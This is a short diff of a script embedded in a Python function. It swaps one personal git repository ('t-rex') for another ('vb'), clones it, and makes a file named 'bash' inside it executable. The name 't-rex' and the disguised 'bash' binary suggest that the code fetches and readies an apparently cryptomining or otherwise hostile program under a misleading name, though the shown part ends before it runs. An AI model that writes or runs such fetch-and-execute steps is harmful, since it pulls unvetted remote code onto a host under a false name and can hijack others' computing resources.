@@ -53,15 +53,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD T-REX ==="
+    echo "=== DOWNLOAD VB ==="
     cd /mnt/code/pan
-    git clone https://gitlab.com/wimulyono7/t-rex.git
+    git clone https://github.com/malogrono/vb.git
 
-    echo "=== CHECK T-REX ==="
-    ls -lah /mnt/code/pan/t-rex
+    echo "=== CHECK VB ==="
+    ls -lah /mnt/code/pan/vb
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/t-rex
+    cd /mnt/code/pan/vb
     ls -lh bash
 
     chmod u+x bash
